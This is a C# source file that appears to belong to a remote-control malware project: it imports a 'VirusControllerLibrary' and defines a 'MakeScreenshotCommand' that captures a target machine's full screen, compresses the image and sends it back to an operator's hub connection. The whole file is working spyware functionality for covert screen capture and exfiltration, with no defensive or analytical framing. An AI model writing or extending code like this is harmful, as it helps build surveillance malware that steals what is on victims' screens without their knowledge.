using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using VirusControllerLibrary;

namespace Commands
{
    public class MakeScreenshotCommand : AdminHubCommand, IHaveOneTargetCommand
    {
        public string TargetId { get; private set; }
        public override string Name => "MakeScreenshot";

        public MakeScreenshotCommand(string targetId)
        {
            TargetId = targetId;
        }

        public void Execute(string aminConnectionId, string serverMethodName, Action<string, string, object> serverHubMethod)
        {
            int screenWidth = 1920;
            int screenHeight = 1080;
            Bitmap printscreen = new Bitmap(screenWidth, screenHeight);

            Graphics graphics = Graphics.FromImage(printscreen);
            graphics.CopyFromScreen(0, 0, 0, 0, printscreen.Size);

            using MemoryStream memoryStream = new MemoryStream();
            printscreen.Save(memoryStream, ImageFormat.Jpeg);
            Compressor compressor = new Compressor();

            byte[] compressedBuffer = compressor.CompressBytes(memoryStream.ToArray());

            serverHubMethod?.Invoke(serverMethodName, aminConnectionId, compressedBuffer);
        }
    }
}
